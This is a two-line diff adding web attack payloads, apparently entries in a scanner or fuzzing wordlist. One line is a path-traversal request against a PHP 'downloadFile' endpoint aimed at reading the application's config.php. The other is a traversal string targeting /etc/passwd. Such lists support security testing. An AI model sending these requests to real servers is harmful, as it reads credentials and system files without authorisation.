@@ -1,0 +1,2 @@
+/new/client.php?m=download&a=downloadFile&file=..%2F../new/Client/Conf/config.php
+/../../../etc/passwd
